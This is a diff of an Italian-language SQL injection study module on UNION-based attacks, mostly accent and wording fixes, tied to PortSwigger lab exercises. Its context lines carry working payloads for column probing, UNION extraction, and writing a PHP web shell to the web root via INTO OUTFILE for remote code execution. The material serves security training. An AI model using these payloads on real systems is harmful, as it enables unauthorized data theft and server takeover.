@@ -1,15 +1,15 @@
 # UNION-Based SQLi
 
-**Difficolta:** Intermediate
+**Difficoltà:** Intermediate
 **Time to Master:** 2.5h
 **Prerequisiti:** [02-Error-Based-SQLi.md](02-Error-Based-SQLi.md)
-**Lab:** PortSwigger Academy — UNION attacks
+**Lab:** PortSwigger Academy: UNION attacks
 
 ---
 
 ## Obiettivo
 
-Usare `UNION SELECT` per combinare i risultati della query originale con una query arbitraria, estraendo dati da altre tabelle del database direttamente nella risposta dell'applicazione.
+`UNION SELECT` ti lascia agganciare i risultati di una query completamente diversa a quella originale, e vederli comparire nella stessa risposta che l'app ti mostra sempre. Se riesci ad allineare colonne e tipi, non stai più solo confermando che l'app è vulnerabile: stai leggendo tabelle che non dovresti nemmeno sapere che esistono.
 
 ---
 
@@ -42,7 +42,7 @@ Usare `UNION SELECT` per combinare i risultati della query originale con una que
 ' ORDER BY 3 --        -- errore = 2 colonne totali
 
 ' UNION SELECT NULL, NULL --
-' UNION SELECT NULL, 'test' --   -- vedi dove compare "test" nella pagina, quella e la colonna stampabile
+' UNION SELECT NULL, 'test' --   -- vedi dove compare "test" nella pagina, quella è la colonna stampabile
 ```
 
 ### Esempio 2: enumerare tabelle e colonne (information_schema)
@@ -82,7 +82,7 @@ orders
 ' UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL INTO OUTFILE '/var/www/html/shell.php' --
 ```
 
-**Spiegazione:** se riuscita, questa tecnica porta a RCE diretta — richiede privilegi elevati sul DB e `secure_file_priv` non restrittivo, condizioni non sempre presenti ma da provare sempre.
+**Spiegazione:** se riuscita, questa tecnica porta a RCE diretta, ma richiede privilegi elevati sul DB e `secure_file_priv` non restrittivo: condizioni non sempre presenti, ma da provare sempre.
 
 ---
 
@@ -99,14 +99,14 @@ orders
 ### Colonne extra quando non conosci il numero esatto
 
 ```sql
-' UNION SELECT NULL,NULL,NULL,NULL,NULL --   -- prova incrementando finche non sparisce l'errore
+' UNION SELECT NULL,NULL,NULL,NULL,NULL --   -- prova incrementando finché non sparisce l'errore
 ```
 
 ---
 
 ## Lab Hands-On
 
-### Lab 1: PortSwigger — SQL injection UNION attack, retrieving data from other tables
+### Lab 1: PortSwigger: SQL injection UNION attack, retrieving data from other tables
 **Obiettivo:** estrarre username/password via UNION
 **Difficulty:** Medio
 **Time:** 30 min
@@ -121,14 +121,14 @@ orders
 
 ## Common Mistakes
 
-- Dimenticare che i tipi devono essere compatibili -> usa NULL come placeholder universale finche non sai i tipi esatti
+- Dimenticare che i tipi devono essere compatibili -> usa NULL come placeholder universale finché non sai i tipi esatti
 - Non provare GROUP_CONCAT quando l'app mostra solo una riga -> perdi dati multipli senza accorgertene
 
 ---
 
 ## Link Utili
 
-- [PortSwigger — UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
+- [PortSwigger: UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
 
 ---
 
@@ -147,8 +147,3 @@ orders
 - [ ] So usare GROUP_CONCAT per estrarre righe multiple in un colpo
 - [ ] Conosco la tecnica INTO OUTFILE per RCE (anche se raramente sfruttabile)
 
----
-
-## Note personali
-
-_(spazio libero)_
